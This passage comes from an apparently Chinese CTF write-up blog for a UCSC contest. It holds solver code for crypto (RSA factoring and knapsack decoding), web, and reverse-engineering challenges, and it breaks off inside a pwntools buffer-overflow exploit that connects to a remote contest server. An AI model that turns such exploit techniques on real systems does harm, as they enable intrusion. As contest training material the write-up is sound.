number\">43353</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31372</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17899</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40304</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25521</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31372</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    e_pow_k <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    term <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>problem1 <span class=\"token operator\">*</span> e_pow_k<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n\n    candidate <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>problem2 <span class=\"token operator\">+</span> term<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n\n    g <span class=\"token operator\">=</span> GCD<span class=\"token punctuation\">(</span>candidate<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> g <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span>\n        q<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">//</span>g<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span>\n    \n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">%</span>q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">tonelli_shanks</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Q <span class=\"token operator\">=</span> p <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n    S <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> Q <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        Q <span class=\"token operator\">//=</span> <span class=\"token number\">2</span>\n        S <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    z <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> kronecker_symbol<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        z <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    M <span class=\"token operator\">=</span> S\n    c_val <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> Q<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n    t <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> Q<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n    R <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>Q <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n  \n    <span class=\"token keyword\">while</span> t <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        i <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> power_mod<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span>i<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        b <span class=\"token operator\">=</span> power_mod<span class=\"token punctuation\">(</span>c_val<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token punctuation\">(</span>M <span class=\"token operator\">-</span> i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n     \n        R <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>R <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n        t <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span> b <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n        c_val <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n        M <span class=\"token operator\">=</span> i\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>Integer<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Integer<span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> R<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">eth_root_prime</span><span class=\"token punctuation\">(</span>c_val<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> e_power<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> e_power <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>e_power <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"e 必须为 2 的幂\"</span>\n    k <span class=\"token operator\">=</span> e_power<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n    roots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>Integer<span class=\"token punctuation\">(</span>c_val<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        new_roots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">for</span> r <span class=\"token keyword\">in</span> roots<span class=\"token punctuation\">:</span>\n            r_mod <span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p\n            <span class=\"token keyword\">if</span> r_mod <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                new_roots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r_mod<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> r_mod <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                    new_roots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">if</span> kronecker_symbol<span class=\"token punctuation\">(</span>r_mod<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                    sqs <span class=\"token operator\">=</span> tonelli_shanks<span class=\"token punctuation\">(</span>r_mod<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n                    new_roots<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>sqs<span class=\"token punctuation\">)</span>\n        roots <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>Integer<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> new_roots<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> roots\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">recover_plaintexts</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> e<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    roots_p <span class=\"token operator\">=</span> eth_root_prime<span class=\"token punctuation\">(</span>c <span class=\"token operator\">%</span> p<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n    roots_q <span class=\"token operator\">=</span> eth_root_prime<span class=\"token punctuation\">(</span>c <span class=\"token operator\">%</span> q<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n    candidates <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> rp <span class=\"token keyword\">in</span> roots_p<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> rq <span class=\"token keyword\">in</span> roots_q<span class=\"token punctuation\">:</span>\n            m <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>rp<span class=\"token punctuation\">,</span> rq<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            candidates<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> candidates\n\nm<span class=\"token operator\">=</span>recover_plaintexts<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n\nA_inv <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">)</span>\nS_primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>S <span class=\"token operator\">*</span> A_inv<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> B <span class=\"token keyword\">for</span> S <span class=\"token keyword\">in</span> S_list<span class=\"token punctuation\">]</span>\n\nbits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> s_prime <span class=\"token keyword\">in</span> S_primes<span class=\"token punctuation\">:</span>\n    group_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    remaining <span class=\"token operator\">=</span> s_prime\n    <span class=\"token keyword\">for</span> r <span class=\"token keyword\">in</span> <span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> remaining <span class=\"token operator\">>=</span> r<span class=\"token punctuation\">:</span>\n            group_bits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            remaining <span class=\"token operator\">-=</span> r\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            group_bits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    group_bits <span class=\"token operator\">=</span> group_bits<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    bits<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>group_bits<span class=\"token punctuation\">)</span>\n\nflag2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    byte_bits <span class=\"token operator\">=</span> bits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\n    byte <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> byte_bits<span class=\"token punctuation\">:</span>\n        byte <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>byte <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> bit\n    flag2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span>\n\nflag2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>flag2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag2 =\"</span><span class=\"token punctuation\">,</span> flag2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span>\n    f1<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f1<span class=\"token punctuation\">)</span>\n    Flags <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;'</span> <span class=\"token operator\">+</span> md5<span class=\"token punctuation\">(</span>f1<span class=\"token operator\">+</span>flag2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'&#125;'</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Flags<span class=\"token punctuation\">)</span></code></pre>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h3 id=\"ezLaravel-ucsc\"><a href=\"#ezLaravel-ucsc\" class=\"headerlink\" title=\"ezLaravel-ucsc\"></a><strong>ezLaravel-ucsc</strong></h3><p>Dirsearch出</p>\n<p><img src=\"/images/1745240699576-32.png\" alt=\"img\"></p>\n<p>访问flag.php得到flag</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h3 id=\"simplere-ucsc\"><a href=\"#simplere-ucsc\" class=\"headerlink\" title=\"simplere-ucsc\"></a>simplere-ucsc</h3><p>UPX壳，直接dbg+dump即可脱壳。</p>\n<p>Base58换表加密</p>\n<p><img src=\"/images/1745240699574-1.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699574-2.png\" alt=\"img\"></p>\n<p>数据倒转异或加密</p>\n<p><img src=\"/images/1745240699574-3.png\" alt=\"img\"></p>\n<pre class=\"language-C++\" data-language=\"C++\"><code class=\"language-C++\">#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\nunsigned __int64 decrypt(BYTE *encrypted, unsigned __int64 strlen_, BYTE *decrypted)\n&#123;\n    unsigned __int64 i;\n\n    for (i &#x3D; 0; i &lt; strlen_; i++)\n    &#123;\n        decrypted[strlen_ - i - 1] &#x3D; encrypted[i] ^ (i + 1);\n    &#125;\n    return i;\n&#125;\n\nint main()\n&#123;\n    unsigned char Enc[] &#x3D;\n        &#123;\n            0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,\n            0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,\n            0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,\n            0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,\n            0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,\n            0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57&#125;;\n\n    unsigned char Dec[100]&#123;&#125;;\n    decrypt((BYTE *)Enc, 58, (BYTE *)Dec);\n\n    printf(&quot;%.58s\\n&quot;, Dec);\n    return 0;\n&#125;\n&#x2F;&#x2F;mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs</code></pre>\n\n<p><img src=\"/images/1745240699574-4.png\" alt=\"img\"></p>\n<h3 id=\"easy-re-ucsc\"><a href=\"#easy-re-ucsc\" class=\"headerlink\" title=\"easy_re-ucsc\"></a>easy_re-ucsc</h3><p><img src=\"/images/1745240699574-5.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699574-6.png\" alt=\"img\"></p>\n<p>异或加密</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\nint main()\n&#123;\n    unsigned char a[] &#x3D; &quot;n&#x3D;&lt;;:h2&lt;&#39;?8:?&#39;9hl9&#39;h:l&gt;&#39;2&gt;&gt;2&gt;hk&#x3D;&gt;;:?&quot;;\n    for (int i &#x3D; 0; i &lt; 36; i++)\n        a[i] ^&#x3D; 10;\n    printf(&quot;%.37s\\n&quot;, a);\n    &#x2F;&#x2F; d7610b86-5205-3bf3-b0f4-84484ba74105\n    return 0;\n&#125;</code></pre>\n\n<h3 id=\"EZ-debug-ucsc\"><a href=\"#EZ-debug-ucsc\" class=\"headerlink\" title=\"EZ_debug-ucsc\"></a>EZ_debug-ucsc</h3><p>断点此处单步运行得到flag</p>\n<p><img src=\"/images/1745240699574-7.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699575-8.png\" alt=\"img\"></p>\n<h3 id=\"re-ez-ucsc\"><a href=\"#re-ez-ucsc\" class=\"headerlink\" title=\"re_ez-ucsc\"></a>re_ez-ucsc</h3><p>单步跟到主要函数</p>\n<p>这边循环输入字符，判断(Inputchar - 32)^3是否&lt;4，这边可以得出一共就四个符合条件的字符</p>\n<pre class=\"language-C++\" data-language=\"C++\"><code class=\"language-C++\">&#39; &#39;, &#39;!&#39;, &#39;\\&quot;&#39;, &#39;#&#39;</code></pre>\n\n<p>要经过一系列输入数据，并且数据变换最终要v0&#x3D;&#x3D;3，然后输出以下内容。</p>\n<p><img src=\"/images/1745240699575-9.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699575-10.png\" alt=\"img\"></p>\n<p>输入的字符串md5就是flag。</p>\n<p>那么直接爆破输入，让最后v0等于3即可得到目标系列字符串。</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;string&gt;\n#include &lt;functional&gt;\n\nint main()\n&#123;\n    unsigned long long k[5] &#x3D; &#123;\n        0xFFFFFFFFFFFFFFFB, 0x0000000000000005, 0xFFFFFFFFFFFFFFFF, 0x0000000000000001,\n        0x0000000000000000&#125;;\n\n    char chars[4] &#x3D; &#123;&#39;#&#39;, &#39;&quot;&#39;, &#39;!&#39;, &#39; &#39;&#125;;\n    for (int len &#x3D; 1; len &lt;&#x3D; 10; len++)\n    &#123;\n        std::vector&lt;std::vector&lt;int&gt;&gt; combinations;\n        std::vector&lt;int&gt; current(len);\n\n        std::function&lt;void(int)&gt; generate &#x3D; [&amp;](int pos)\n        &#123;\n            if (pos &#x3D;&#x3D; len)\n            &#123;\n                combinations.push_back(current);\n                return;\n            &#125;\n\n            for (int i &#x3D; 0; i &lt; 4; i++)\n            &#123;\n                current[pos] &#x3D; i;\n                generate(pos + 1);\n            &#125;\n        &#125;;\n\n        generate(0);\n\n        for (const auto &amp;comb : combinations)\n        &#123;\n            unsigned int map[25] &#x3D; &#123;\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000001,\n                0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x00000001&#125;;\n\n            unsigned long long v0 &#x3D; 1;\n            std::string a;\n            bool valid &#x3D; true;\n\n            for (int i &#x3D; 0; i &lt; len; i++)\n            &#123;\n                char c &#x3D; chars[comb[i]];\n                a.push_back(c);\n\n                uint8_t v &#x3D; c;\n                uint8_t v13 &#x3D; (v - 32) ^ 3;\n                v0 +&#x3D; k[v13];\n\n                if (v0 &gt; 0x18 || map[v0])\n                &#123;\n                    valid &#x3D; false;\n                    break;\n                &#125;\n\n                map[v0] &#x3D; 1;\n\n                if (v0 &#x3D;&#x3D; 3)\n                &#123;\n                    std::cout &lt;&lt; a &lt;&lt; std::endl;\n                    return 0;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n    return 0;\n&#125;\n&#x2F;&#x2F; &quot;&quot;&quot;  ###</code></pre>\n\n<p><img src=\"/images/1745240699575-11.png\" alt=\"img\"></p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><h3 id=\"BoFido-ucsc\"><a href=\"#BoFido-ucsc\" class=\"headerlink\" title=\"BoFido-ucsc\"></a><strong>BoFido-ucsc</strong></h3><p>开始输入有溢出，可以把随机种子改为任意值。把种子设为0这样就能通关了</p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\n<span class=\"token comment\">#io=remote(\"dicec.tf\", 32030)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">bunny</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#idx=idx</span>\n\nans<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n\nval<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\npredict<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"./predict\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"100\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        a<span class=\"token operator\">=</span>predict<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print hex(int(a[1]))</span>\n        val<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.107.58.236\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44590</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#io=process(\"./BoFido\")</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nsa<span class=\"token 